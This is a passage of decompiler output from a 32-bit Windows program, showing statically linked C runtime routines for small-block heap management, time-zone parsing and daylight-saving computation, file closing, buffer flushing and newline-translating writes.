        puVar8 = (uint *)(uVar6 + 0xc4 + uVar10 * 4);
        bVar9 = bVar9 - 0x20;
      }
      *puVar8 = *puVar8 | 0x80000000U >> (bVar9 & 0x1f);
    }
    *piVar3 = param_3;
    *(int *)(param_3 + -4 + (int)piVar3) = param_3;
  }
  return 1;
}



undefined ** FUN_004080bf(void)

{
  bool bVar1;
  int *lpAddress;
  LPVOID pvVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined **lpMem;
  
  if (DAT_0040f980 == -1) {
    lpMem = &PTR_LOOP_0040f970;
  }
  else {
    lpMem = (undefined **)HeapAlloc(DAT_00413900,0,0x2020);
    if (lpMem == (undefined **)0x0) {
      return (undefined **)0x0;
    }
  }
  lpAddress = (int *)VirtualAlloc((LPVOID)0x0,0x400000,0x2000,4);
  if (lpAddress != (int *)0x0) {
    pvVar2 = VirtualAlloc(lpAddress,0x10000,0x1000,4);
    if (pvVar2 != (LPVOID)0x0) {
      if (lpMem == &PTR_LOOP_0040f970) {
        if (PTR_LOOP_0040f970 == (undefined *)0x0) {
          PTR_LOOP_0040f970 = (undefined *)&PTR_LOOP_0040f970;
        }
        if (PTR_LOOP_0040f974 == (undefined *)0x0) {
          PTR_LOOP_0040f974 = (undefined *)&PTR_LOOP_0040f970;
        }
      }
      else {
        *lpMem = (undefined *)&PTR_LOOP_0040f970;
        lpMem[1] = PTR_LOOP_0040f974;
        PTR_LOOP_0040f974 = (undefined *)lpMem;
        *(undefined ***)lpMem[1] = lpMem;
      }
      lpMem[5] = (undefined *)(lpAddress + 0x100000);
      ppuVar3 = lpMem + 6;
      lpMem[3] = (undefined *)(lpMem + 0x26);
      lpMem[4] = (undefined *)lpAddress;
      lpMem[2] = (undefined *)ppuVar3;
      iVar4 = 0;
      do {
        bVar1 = 0xf < iVar4;
        iVar4 = iVar4 + 1;
        *ppuVar3 = (undefined *)((bVar1 - 1 & 0xf1) - 1);
        ppuVar3[1] = (undefined *)0xf1;
        ppuVar3 = ppuVar3 + 2;
      } while (iVar4 < 0x400);
      _memset(lpAddress,0,0x10000);
      for (; lpAddress < lpMem[4] + 0x10000; lpAddress = lpAddress + 0x400) {
        *(undefined *)(lpAddress + 0x3e) = 0xff;
        *lpAddress = (int)(lpAddress + 2);
        lpAddress[1] = 0xf0;
      }
      return lpMem;
    }
    VirtualFree(lpAddress,0,0x8000);
  }
  if (lpMem != &PTR_LOOP_0040f970) {
    HeapFree(DAT_00413900,0,lpMem);
  }
  return (undefined **)0x0;
}



void FUN_00408203(undefined **param_1)

{
  VirtualFree(param_1[4],0,0x8000);
  if ((undefined **)PTR_LOOP_00411990 == param_1) {
    PTR_LOOP_00411990 = param_1[1];
  }
  if (param_1 != &PTR_LOOP_0040f970) {
    *(undefined **)param_1[1] = *param_1;
    *(undefined **)(*param_1 + 4) = param_1[1];
    HeapFree(DAT_00413900,0,param_1);
    return;
  }
  DAT_0040f980 = 0xffffffff;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00408259(int param_1)

{
  BOOL BVar1;
  int *piVar2;
  int iVar3;
  undefined *puVar4;
  undefined *puVar5;
  int local_8;
  
  puVar4 = PTR_LOOP_0040f974;
  do {
    puVar5 = puVar4;
    if (*(int *)(puVar4 + 0x10) != -1) {
      local_8 = 0;
      piVar2 = (int *)(puVar4 + 0x2010);
      iVar3 = 0x3ff000;
      do {
        if (*piVar2 == 0xf0) {
          BVar1 = VirtualFree((LPVOID)(iVar3 + *(int *)(puVar4 + 0x10)),0x1000,0x4000);
          if (BVar1 != 0) {
            *piVar2 = -1;
            _DAT_00412360 = _DAT_00412360 + -1;
            if ((*(int **)(puVar4 + 0xc) == (int *)0x0) || (piVar2 < *(int **)(puVar4 + 0xc))) {
              *(int **)(puVar4 + 0xc) = piVar2;
            }
            local_8 = local_8 + 1;
            param_1 = param_1 + -1;
            if (param_1 == 0) break;
          }
        }
        iVar3 = iVar3 + -0x1000;
        piVar2 = piVar2 + -2;
      } while (-1 < iVar3);
      puVar5 = *(undefined **)(puVar4 + 4);
      if ((local_8 != 0) && (*(int *)(puVar4 + 0x18) == -1)) {
        piVar2 = (int *)(puVar4 + 0x20);
        iVar3 = 1;
        do {
          if (*piVar2 != -1) break;
          iVar3 = iVar3 + 1;
          piVar2 = piVar2 + 2;
        } while (iVar3 < 0x400);
        if (iVar3 == 0x400) {
          FUN_00408203(puVar4);
        }
      }
    }
    if ((puVar5 == PTR_LOOP_0040f974) || (puVar4 = puVar5, param_1 < 1)) {
      return;
    }
  } while( true );
}



int FUN_0040831b(undefined *param_1,int **param_2,uint *param_3)

{
  undefined **ppuVar1;
  uint uVar2;
  
  ppuVar1 = &PTR_LOOP_0040f970;
  while ((param_1 < ppuVar1[4] || param_1 == ppuVar1[4] || (ppuVar1[5] <= param_1))) {
    ppuVar1 = (undefined **)*ppuVar1;
    if (ppuVar1 == &PTR_LOOP_0040f970) {
      return 0;
    }
  }
  if (((uint)param_1 & 0xf) != 0) {
    return 0;
  }
  if (((uint)param_1 & 0xfff) < 0x100) {
    return 0;
  }
  *param_2 = (int *)ppuVar1;
  uVar2 = (uint)param_1 & 0xfffff000;
  *param_3 = uVar2;
  return ((int)(param_1 + (-0x100 - uVar2)) >> 4) + 8 + uVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00408372(int param_1,int param_2,byte *param_3)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)(param_1 + 0x18 + (param_2 - *(int *)(param_1 + 0x10) >> 0xc) * 8);
  *piVar1 = *piVar1 + (uint)*param_3;
  *param_3 = 0;
  piVar1[1] = 0xf1;
  iVar2 = _DAT_00412360;
  if ((*piVar1 == 0xf0) && (_DAT_00412360 = _DAT_00412360 + 1, iVar2 == 0x1f)) {
    FUN_00408259(0x10);
  }
  return;
}



// WARNING: Type propagation algorithm not settling

int * FUN_004083b7(uint param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  undefined *puVar6;
  undefined **ppuVar7;
  int *piVar8;
  undefined **ppuVar9;
  int local_8;
  
  piVar8 = (int *)PTR_LOOP_00411990;
  do {
    if (piVar8[4] != -1) {
      piVar5 = (int *)piVar8[2];
      iVar3 = ((int)piVar5 + (-0x18 - (int)piVar8) >> 3) * 0x1000 + piVar8[4];
      if (piVar5 < piVar8 + 0x806) {
        do {
          if (((int)param_1 <= *piVar5) && (param_1 <= (uint)piVar5[1] && piVar5[1] != param_1)) {
            piVar4 = (int *)FUN_004085bf(iVar3,*piVar5,param_1);
            if (piVar4 != (int *)0x0) goto LAB_00408482;
            piVar5[1] = param_1;
          }
          piVar5 = piVar5 + 2;
          iVar3 = iVar3 + 0x1000;
        } while (piVar5 < piVar8 + 0x806);
      }
      piVar1 = (int *)piVar8[2];
      iVar3 = piVar8[4];
      for (piVar5 = piVar8 + 6; piVar5 < piVar1; piVar5 = piVar5 + 2) {
        if (((int)param_1 <= *piVar5) && (param_1 <= (uint)piVar5[1] && piVar5[1] != param_1)) {
          piVar4 = (int *)FUN_004085bf(iVar3,*piVar5,param_1);
          if (piVar4 != (int *)0x0) {
LAB_00408482:
            PTR_LOOP_00411990 = (undefined *)piVar8;
            *piVar5 = *piVar5 - param_1;
            piVar8[2] = (int)piVar5;
            return piVar4;
          }
          piVar5[1] = param_1;
        }
        iVar3 = iVar3 + 0x1000;
      }
    }
    piVar8 = (int *)*piVar8;
    if (piVar8 == (int *)PTR_LOOP_00411990) {
      ppuVar9 = &PTR_LOOP_0040f970;
      while ((ppuVar9[4] == (undefined *)0xffffffff || (ppuVar9[3] == (undefined *)0x0))) {
        ppuVar9 = (undefined **)*ppuVar9;
        if (ppuVar9 == &PTR_LOOP_0040f970) {
          puVar6 = (undefined *)FUN_004080bf();
          if (puVar6 == (undefined *)0x0) {
            return (int *)0x0;
          }
          piVar8 = *(int **)(puVar6 + 0x10);
          *(char *)(piVar8 + 2) = (char)param_1;
          PTR_LOOP_00411990 = puVar6;
          *piVar8 = (int)piVar8 + param_1 + 8;
          piVar8[1] = 0xf0 - param_1;
          *(uint *)(puVar6 + 0x18) = *(int *)(puVar6 + 0x18) - (param_1 & 0xff);
          return piVar8 + 0x40;
        }
      }
      ppuVar2 = (undefined **)ppuVar9[3];
      local_8 = 0;
      piVar8 = (int *)(ppuVar9[4] + ((int)ppuVar2 + (-0x18 - (int)ppuVar9) >> 3) * 0x1000);
      puVar6 = *ppuVar2;
      ppuVar7 = ppuVar2;
      for (; (puVar6 == (undefined *)0xffffffff && (local_8 < 0x10)); local_8 = local_8 + 1) {
        ppuVar7 = ppuVar7 + 2;
        puVar6 = *ppuVar7;
      }
      piVar5 = (int *)VirtualAlloc(piVar8,local_8 << 0xc,0x1000,4);
      if (piVar5 != piVar8) {
        return (int *)0x0;
      }
      _memset(piVar8,local_8 << 0xc,0);
      ppuVar7 = ppuVar2;
      if (0 < local_8) {
        piVar5 = piVar8 + 1;
        do {
          *(undefined *)(piVar5 + 0x3d) = 0xff;
          piVar5[-1] = (int)(piVar5 + 1);
          *piVar5 = 0xf0;
          *ppuVar7 = (undefined *)0xf0;
          ppuVar7[1] = (undefined *)0xf1;
          piVar5 = piVar5 + 0x400;
          ppuVar7 = ppuVar7 + 2;
          local_8 = local_8 + -1;
        } while (local_8 != 0);
      }
      for (; (ppuVar7 < ppuVar9 + 0x806 && (*ppuVar7 != (undefined *)0xffffffff));
          ppuVar7 = ppuVar7 + 2) {
      }
      PTR_LOOP_00411990 = (undefined *)ppuVar9;
      ppuVar9[3] = (undefined *)(-(uint)(ppuVar7 < ppuVar9 + 0x806) & (uint)ppuVar7);
      *(char *)(piVar8 + 2) = (char)param_1;
      ppuVar9[2] = (undefined *)ppuVar2;
      *ppuVar2 = *ppuVar2 + -param_1;
      piVar8[1] = piVar8[1] - param_1;
      *piVar8 = (int)piVar8 + param_1 + 8;
      return piVar8 + 0x40;
    }
  } while( true );
}



int FUN_004085bf(int **param_1,int *param_2,int *param_3)

{
  int **ppiVar1;
  int **ppiVar2;
  undefined uVar3;
  int **ppiVar4;
  int *piVar5;
  int **ppiVar6;
  
  ppiVar2 = (int **)*param_1;
  ppiVar1 = param_1 + 0x3e;
  uVar3 = SUB41(param_3,0);
  if (param_1[1] < param_3) {
    ppiVar4 = (int **)((int)param_1[1] + (int)ppiVar2);
    ppiVar6 = ppiVar2;
    if (*(char *)ppiVar4 != '\0') {
      ppiVar6 = ppiVar4;
    }
    while( true ) {
      while( true ) {
        if (ppiVar1 <= (int **)((int)ppiVar6 + (int)param_3)) {
          ppiVar6 = param_1 + 2;
          while( true ) {
            while( true ) {
              if (ppiVar2 <= ppiVar6) {
                return 0;
              }
              if (ppiVar1 <= (int **)((int)ppiVar6 + (int)param_3)) {
                return 0;
              }
              if (*(byte *)ppiVar6 == 0) break;
              ppiVar6 = (int **)((int)ppiVar6 + (uint)*(byte *)ppiVar6);
            }
            piVar5 = (int *)0x1;
            ppiVar4 = ppiVar6;
            while (ppiVar4 = (int **)((int)ppiVar4 + 1), *(char *)ppiVar4 == '\0') {
              piVar5 = (int *)((int)piVar5 + 1);
            }
            if (param_3 <= piVar5) break;
            param_2 = (int *)((int)param_2 - (int)piVar5);
            ppiVar6 = ppiVar4;
            if (param_2 < param_3) {
              return 0;
            }
          }
          if ((int **)((int)ppiVar6 + (int)param_3) < ppiVar1) {
            *param_1 = (int *)(int **)((int)ppiVar6 + (int)param_3);
            param_1[1] = (int *)((int)piVar5 - (int)param_3);
          }
          else {
            param_1[1] = (int *)0x0;
            *param_1 = (int *)(param_1 + 2);
          }
          *(undefined *)ppiVar6 = uVar3;
          ppiVar2 = ppiVar6 + 2;
          goto LAB_004086d2;
        }
        if (*(byte *)ppiVar6 == 0) break;
        ppiVar6 = (int **)((int)ppiVar6 + (uint)*(byte *)ppiVar6);
      }
      piVar5 = (int *)0x1;
      ppiVar4 = ppiVar6;
      while (ppiVar4 = (int **)((int)ppiVar4 + 1), *(char *)ppiVar4 == '\0') {
        piVar5 = (int *)((int)piVar5 + 1);
      }
      if (param_3 <= piVar5) break;
      if (ppiVar6 == ppiVar2) {
        param_1[1] = piVar5;
        ppiVar6 = ppiVar4;
      }
      else {
        param_2 = (int *)((int)param_2 - (int)piVar5);
        ppiVar6 = ppiVar4;
        if (param_2 < param_3) {
          return 0;
        }
      }
    }
    if ((int **)((int)ppiVar6 + (int)param_3) < ppiVar1) {
      *param_1 = (int *)(int **)((int)ppiVar6 + (int)param_3);
      param_1[1] = (int *)((int)piVar5 - (int)param_3);
    }
    else {
      param_1[1] = (int *)0x0;
      *param_1 = (int *)(param_1 + 2);
    }
    *(undefined *)ppiVar6 = uVar3;
    ppiVar2 = ppiVar6 + 2;
  }
  else {
    *(undefined *)ppiVar2 = uVar3;
    if ((int **)((int)ppiVar2 + (int)param_3) < ppiVar1) {
      *param_1 = (int *)((int)*param_1 + (int)param_3);
      param_1[1] = (int *)((int)param_1[1] - (int)param_3);
    }
    else {
      param_1[1] = (int *)0x0;
      *param_1 = (int *)(param_1 + 2);
    }
    ppiVar2 = ppiVar2 + 2;
  }
LAB_004086d2:
  return (int)ppiVar2 * 0x10 + (int)param_1 * -0xf;
}



undefined4 FUN_004086e3(int param_1,int **param_2,int **param_3,uint param_4)

{
  int **ppiVar1;
  int *piVar2;
  char cVar3;
  int **ppiVar4;
  int *piVar5;
  uint uVar6;
  
  uVar6 = (uint)*(byte *)param_3;
  piVar2 = (int *)(param_1 + 0x18 + ((int)param_2 - *(int *)(param_1 + 0x10) >> 0xc) * 8);
  if (param_4 < uVar6) {
    *(undefined *)param_3 = (undefined)param_4;
    *piVar2 = *piVar2 + (uVar6 - param_4);
    piVar2[1] = 0xf1;
  }
  else {
    if (param_4 <= uVar6) {
      return 0;
    }
    ppiVar1 = (int **)((int)param_3 + param_4);
    if (param_2 + 0x3e < ppiVar1) {
      return 0;
    }
    for (ppiVar4 = (int **)(uVar6 + (int)param_3); (ppiVar4 < ppiVar1 && (*(char *)ppiVar4 == '\0'))
        ; ppiVar4 = (int **)((int)ppiVar4 + 1)) {
    }
    if (ppiVar4 != ppiVar1) {
      return 0;
    }
    *(undefined *)param_3 = (undefined)param_4;
    if ((param_3 <= *param_2) && (*param_2 < ppiVar1)) {
      if (ppiVar1 < param_2 + 0x3e) {
        piVar5 = (int *)0x0;
        *param_2 = (int *)ppiVar1;
        cVar3 = *(char *)ppiVar1;
        while (cVar3 == '\0') {
          piVar5 = (int *)((int)piVar5 + 1);
          cVar3 = *(char *)((int)ppiVar1 + (int)piVar5);
        }
        param_2[1] = piVar5;
      }
      else {
        param_2[1] = (int *)0x0;
        *param_2 = (int *)(param_2 + 2);
      }
    }
    *piVar2 = *piVar2 + (uVar6 - param_4);
  }
  return 1;
}



undefined4 FUN_0040878c(undefined4 param_1)

{
  int iVar1;
  
  if (DAT_00412368 != (code *)0x0) {
    iVar1 = (*DAT_00412368)(param_1);
    if (iVar1 != 0) {
      return 1;
    }
  }
  return 0;
}



// WARNING: Could not reconcile some variable overlaps

uint __thiscall FUN_004087a7(uint param_1_00,uint param_1,uint param_2)

{
  int iVar1;
  undefined4 uVar2;
  uint local_8;
  
  if (param_1 + 1 < 0x101) {
    param_1._2_2_ = *(ushort *)(PTR_DAT_00411998 + param_1 * 2);
  }
  else {
    if ((PTR_DAT_00411998[((int)param_1 >> 8 & 0xffU) * 2 + 1] & 0x80) == 0) {
      local_8 = param_1 & 0xff | (uint)((uint3)(param_1_00 >> 8) & 0xffff00) << 8;
      uVar2 = 1;
    }
    else {
      local_8._0_2_ = CONCAT11((char)param_1,(char)(param_1 >> 8));
      local_8 = param_1_00 & 0xff000000 | (uint)(ushort)local_8;
      uVar2 = 2;
    }
    iVar1 = FUN_0040aab8(1,&local_8,uVar2,(int)&param_1 + 2,0,0,1);
    if (iVar1 == 0) {
      return 0;
    }
  }
  return param_1._2_2_ & param_2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040881c(void)

{
  if (_DAT_00412428 == 0) {
    FUN_00408831();
    _DAT_00412428 = _DAT_00412428 + 1;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00408831(void)

{
  char cVar1;
  char cVar2;
  char *_Str1;
  DWORD DVar3;
  int iVar4;
  size_t sVar5;
  char *_Source;
  int local_4;
  
  _DAT_00412370 = 0;
  _DAT_00411c58 = 0xffffffff;
  _DAT_00411c48 = 0xffffffff;
  _Str1 = (char *)FUN_0040ad0e(&DAT_0040d474);
  if (_Str1 == (char *)0x0) {
    DVar3 = GetTimeZoneInformation((LPTIME_ZONE_INFORMATION)&DAT_00412378);
    if (DVar3 == 0xffffffff) {
      return;
    }
    DAT_00411bb0 = DAT_00412378 * 0x3c;
    _DAT_00412370 = 1;
    if (DAT_004123be != 0) {
      DAT_00411bb0 = DAT_00411bb0 + DAT_004123cc * 0x3c;
    }
    if ((DAT_00412412 == 0) || (DAT_00412420 == 0)) {
      _DAT_00411bb4 = 0;
      _DAT_00411bb8 = 0;
    }
    else {
      _DAT_00411bb4 = 1;
      _DAT_00411bb8 = (DAT_00412420 - DAT_004123cc) * 0x3c;
    }
    iVar4 = WideCharToMultiByte(DAT_00412358,0x220,(LPCWSTR)&DAT_0041237c,-1,PTR_DAT_00411c3c,0x3f,
                                (LPCSTR)0x0,&local_4);
    if ((iVar4 == 0) || (local_4 != 0)) {
      *PTR_DAT_00411c3c = 0;
    }
    else {
      PTR_DAT_00411c3c[0x3f] = 0;
    }
    iVar4 = WideCharToMultiByte(DAT_00412358,0x220,(LPCWSTR)&DAT_004123d0,-1,PTR_DAT_00411c40,0x3f,
                                (LPCSTR)0x0,&local_4);
    if ((iVar4 != 0) && (local_4 == 0)) {
      PTR_DAT_00411c40[0x3f] = 0;
      return;
    }
  }
  else {
    if (*_Str1 == '\0') {
      return;
    }
    if ((DAT_00412424 != (char *)0x0) && (iVar4 = _strcmp(_Str1,DAT_00412424), iVar4 == 0)) {
      return;
    }
    FUN_00404b0a(DAT_00412424);
    sVar5 = _strlen(_Str1);
    DAT_00412424 = (char *)_malloc(sVar5 + 1);
    if (DAT_00412424 == (char *)0x0) {
      return;
    }
    FID_conflict___mbscpy(DAT_00412424,_Str1);
    _strncpy(PTR_DAT_00411c3c,_Str1,3);
    _Source = _Str1 + 3;
    PTR_DAT_00411c3c[3] = 0;
    cVar2 = *_Source;
    if (cVar2 == '-') {
      _Source = _Str1 + 4;
    }
    iVar4 = FUN_00404ce4(_Source);
    DAT_00411bb0 = iVar4 * 0xe10;
    for (; (cVar1 = *_Source, cVar1 == '+' || (('/' < cVar1 && (cVar1 < ':'))));
        _Source = _Source + 1) {
    }
    if (*_Source == ':') {
      _Source = _Source + 1;
      iVar4 = FUN_00404ce4(_Source);
      DAT_00411bb0 = DAT_00411bb0 + iVar4 * 0x3c;
      for (; ('/' < *_Source && (*_Source < ':')); _Source = _Source + 1) {
      }
      if (*_Source == ':') {
        _Source = _Source + 1;
        iVar4 = FUN_00404ce4(_Source);
        DAT_00411bb0 = DAT_00411bb0 + iVar4;
        for (; ('/' < *_Source && (*_Source < ':')); _Source = _Source + 1) {
        }
      }
    }
    if (cVar2 == '-') {
      DAT_00411bb0 = -DAT_00411bb0;
    }
    _DAT_00411bb4 = (int)*_Source;
    if (_DAT_00411bb4 != 0) {
      _strncpy(PTR_DAT_00411c40,_Source,3);
      PTR_DAT_00411c40[3] = 0;
      return;
    }
  }
  *PTR_DAT_00411c40 = 0;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

bool FUN_00408a8f(int *param_1)

{
  int iVar1;
  int iVar2;
  undefined2 uVar3;
  undefined2 uVar4;
  undefined2 uVar5;
  
  if (_DAT_00411bb4 != 0) {
    iVar2 = param_1[5];
    if ((iVar2 != _DAT_00411c48) || (iVar2 != _DAT_00411c58)) {
      if (_DAT_00412370 == 0) {
        FUN_00408c3b(1,1,iVar2,4,1,0,0,2,0,0,0);
        FUN_00408c3b(0,1,param_1[5],10,5,0,0,2,0,0,0);
      }
      else {
        if (_DAT_00412410 != 0) {
          uVar4 = 0;
          uVar3 = 0;
          uVar5 = DAT_00412416;
        }
        else {
          uVar4 = DAT_00412414;
          uVar3 = DAT_00412416;
          uVar5 = 0;
        }
        FUN_00408c3b(1,_DAT_00412410 == 0,iVar2,DAT_00412412,uVar3,uVar4,uVar5,DAT_00412418,
                     DAT_0041241a,DAT_0041241c,DAT_0041241e);
        if (_DAT_004123bc != 0) {
          uVar4 = 0;
          uVar3 = 0;
          iVar2 = param_1[5];
          uVar5 = DAT_004123c2;
        }
        else {
          iVar2 = param_1[5];
          uVar4 = DAT_004123c0;
          uVar3 = DAT_004123c2;
          uVar5 = 0;
        }
        FUN_00408c3b(0,_DAT_004123bc == 0,iVar2,DAT_004123be,uVar3,uVar4,uVar5,DAT_004123c4,
                     DAT_004123c6,DAT_004123c8,DAT_004123ca);
      }
    }
    iVar2 = param_1[7];
    if (DAT_00411c4c < DAT_00411c5c) {
      if ((DAT_00411c4c <= iVar2) && (iVar2 <= DAT_00411c5c)) {
        if ((DAT_00411c4c < iVar2) && (iVar2 < DAT_00411c5c)) {
          return true;
        }
LAB_00408c07:
        iVar1 = ((param_1[2] * 0x3c + param_1[1]) * 0x3c + *param_1) * 1000;
        if (iVar2 == DAT_00411c4c) {
          return _DAT_00411c50 <= iVar1;
        }
        return iVar1 < _DAT_00411c60;
      }
    }
    else {
      if (iVar2 < DAT_00411c5c) {
        return true;
      }
      if (DAT_00411c4c < iVar2) {
        return true;
      }
      if ((iVar2 <= DAT_00411c5c) || (DAT_00411c4c <= iVar2)) goto LAB_00408c07;
    }
  }
  return false;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00408c3b(int param_1,int param_2,uint param_3,int param_4,int param_5,int param_6,
                 int param_7,int param_8,int param_9,int param_10,int param_11)

{
  undefined *puVar1;
  int iVar2;
  
  if (param_2 == 1) {
    if ((param_3 & 3) == 0) {
      puVar1 = (&PTR_FUN_0040f8f4)[param_4];
    }
    else {
      puVar1 = *(undefined **)(&DAT_0040f928 + param_4 * 4);
    }
    iVar2 = (int)(puVar1 + param_3 * 0x16d + ((int)(param_3 - 1) >> 2) + -0x63da) % 7;
    if (param_6 < iVar2) {
      iVar2 = (param_5 * 7 - iVar2) + param_6 + 1;
    }
    else {
      iVar2 = (param_5 * 7 - iVar2) + param_6 + -6;
    }
    puVar1 = puVar1 + iVar2;
    if (param_5 == 5) {
      if ((param_3 & 3) == 0) {
        iVar2 = *(int *)(&DAT_0040f8f8 + param_4 * 4);
      }
      else {
        iVar2 = (&DAT_0040f92c)[param_4];
      }
      if (iVar2 < (int)puVar1) {
        puVar1 = puVar1 + -7;
      }
    }
  }
  else {
    if ((param_3 & 3) == 0) {
      puVar1 = (&PTR_FUN_0040f8f4)[param_4];
    }
    else {
      puVar1 = *(undefined **)(&DAT_0040f928 + param_4 * 4);
    }
    puVar1 = puVar1 + param_7;
  }
  if (param_1 == 1) {
    _DAT_00411c48 = param_3;
    _DAT_00411c50 = ((param_8 * 0x3c + param_9) * 0x3c + param_10) * 1000 + param_11;
    DAT_00411c4c = puVar1;
  }
  else {
    _DAT_00411c60 = ((param_8 * 0x3c + param_9) * 0x3c + _DAT_00411bb8 + param_10) * 1000 + param_11
    ;
    if (_DAT_00411c60 < 0) {
      _DAT_00411c60 = _DAT_00411c60 + 86400000;
      DAT_00411c5c = puVar1 + -1;
    }
    else {
      DAT_00411c5c = puVar1;
      if (86399999 < _DAT_00411c60) {
        _DAT_00411c60 = _DAT_00411c60 + -86400000;
        DAT_00411c5c = puVar1 + 1;
      }
    }
    _DAT_00411c58 = param_3;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00408d7b(uint param_1)

{
  int iVar1;
  int iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  if (DAT_004138e0 <= param_1) {
    _DAT_004122f8 = 0;
    _DAT_004122f4 = 9;
    return 0xffffffff;
  }
  iVar5 = (param_1 & 0x1f) * 8;
  if ((*(byte *)((&DAT_004137e0)[(int)param_1 >> 5] + 4 + iVar5) & 1) == 0) {
    _DAT_004122f4 = 9;
    _DAT_004122f8 = 0;
    return 0xffffffff;
  }
  iVar1 = FUN_0040ae6c(param_1);
  if (iVar1 != -1) {
    if ((param_1 == 1) || (param_1 == 2)) {
      iVar1 = FUN_0040ae6c(2);
      iVar2 = FUN_0040ae6c(1);
      if (iVar2 == iVar1) goto LAB_00408df4;
    }
    hObject = (HANDLE)FUN_0040ae6c(param_1);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_00408df6;
    }
  }
LAB_00408df4:
  DVar4 = 0;
LAB_00408df6:
  FUN_0040adf2(param_1);
  *(undefined *)((&DAT_004137e0)[(int)param_1 >> 5] + 4 + iVar5) = 0;
  if (DVar4 == 0) {
    return 0;
  }
  FUN_0040ad8b(DVar4);
  return 0xffffffff;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2003 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    FUN_00404b0a(_File->_base);
    *(ushort *)&_File->_flag = *(ushort *)&_File->_flag & 0xfbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



int FUN_00408e59(int param_1)

{
  int iVar1;
  
  if (param_1 == 0) {
    iVar1 = _flsall(0);
    return iVar1;
  }
  iVar1 = FUN_00408e94(param_1);
  if (iVar1 != 0) {
    return -1;
  }
  if ((*(byte *)(param_1 + 0xd) & 0x40) != 0) {
    iVar1 = FUN_0040aea9(*(undefined4 *)(param_1 + 0x10));
    return -(uint)(iVar1 != 0);
  }
  return 0;
}



undefined4 FUN_00408e94(int *param_1)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  
  uVar2 = 0;
  if ((((byte)param_1[3] & 3) == 2) && ((param_1[3] & 0x108U) != 0)) {
    iVar3 = *param_1 - param_1[2];
    if (0 < iVar3) {
      iVar1 = FUN_00408f66(param_1[4],param_1[2],iVar3);
      if (iVar1 == iVar3) {
        if ((param_1[3] & 0x80U) != 0) {
          param_1[3] = param_1[3] & 0xfffffffd;
        }
      }
      else {
        param_1[3] = param_1[3] | 0x20;
        uVar2 = 0xffffffff;
      }
    }
  }
  param_1[1] = 0;
  *param_1 = param_1[2];
  return uVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _flsall
// 
// Library: Visual Studio 2003 Release

int _flsall(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  
  iVar3 = 0;
  iVar2 = 0;
  iVar4 = 0;
  if (0 < _DAT_004137c0) {
    do {
      iVar1 = *(int *)(DAT_004127a8 + iVar3 * 4);
      if ((iVar1 != 0) && ((*(uint *)(iVar1 + 0xc) & 0x83) != 0)) {
        if (param_1 == 1) {
          iVar1 = FUN_00408e59(iVar1);
          if (iVar1 != -1) {
            iVar2 = iVar2 + 1;
          }
        }
        else if ((param_1 == 0) && ((*(uint *)(iVar1 + 0xc) & 2) != 0)) {
          iVar1 = FUN_00408e59(iVar1);
          if (iVar1 == -1) {
            iVar4 = -1;
          }
        }
      }
      iVar3 = iVar3 + 1;
    } while (iVar3 < _DAT_004137c0);
  }
  if (param_1 != 1) {
    iVar2 = iVar4;
  }
  return iVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_00408f66(DWORD param_1,char *param_2,uint param_3)

{
  int *piVar1;
  byte bVar2;
  char cVar3;
  char *pcVar4;
  char *pcVar5;
  BOOL BVar6;
  int iVar7;
  char local_418 [1028];
  int local_14;
  DWORD local_10;
  DWORD local_c;
  char *local_8;
  
  if (param_1 < DAT_004138e0) {
    piVar1 = &DAT_004137e0 + ((int)param_1 >> 5);
    iVar7 = (param_1 & 0x1f) * 8;
    bVar2 = *(byte *)(*piVar1 + 4 + iVar7);
    if ((bVar2 & 1) != 0) {
      local_c = 0;
      local_14 = 0;
      if (param_3 == 0) {
        return 0;
      }
      if ((bVar2 & 0x20) != 0) {
        FUN_00409f2f(param_1,0,2);
      }
      if ((*(byte *)((HANDLE *)(*piVar1 + iVar7) + 1) & 0x80) == 0) {
        BVar6 = WriteFile(*(HANDLE *)(*piVar1 + iVar7),param_2,param_3,&local_10,(LPOVERLAPPED)0x0);
        if (BVar6 == 0) {
          param_1 = GetLastError();
        }
        else {
          local_c = local_10;
          param_1 = 0;
        }
LAB_0040905f:
        if (local_c != 0) {
          return local_c - local_14;
        }
        if (param_1 != 0) {
          if (param_1 == 5) {
            _DAT_004122f4 = 9;
            _DAT_004122f8 = 5;
            return -1;
          }
          FUN_0040ad8b(param_1);
          return -1;
        }
      }
      else {
        local_8 = param_2;
        param_1 = 0;
        if (param_3 != 0) {
          do {
            pcVar5 = local_418;
            do {
              if (param_3 <= (uint)((int)local_8 - (int)param_2)) break;
              pcVar4 = local_8 + 1;
              cVar3 = *local_8;
              local_8 = pcVar4;
              if (cVar3 == '\n') {
                local_14 = local_14 + 1;
                *pcVar5 = '\r';
                pcVar5 = pcVar5 + 1;
              }
              *pcVar5 = cVar3;
              pcVar5 = pcVar5 + 1;
            } while ((int)pcVar5 - (int)local_418 < 0x400);
            BVar6 = WriteFile(*(HANDLE *)(*piVar1 + iVar7),local_418,(int)pcVar5 - (int)local_418,
                              &local_10,(LPOVERLAPPED)0x0);
            if (BVar6 == 0) {
              param_1 = GetLastError();
              goto LAB_0040905f;
            }
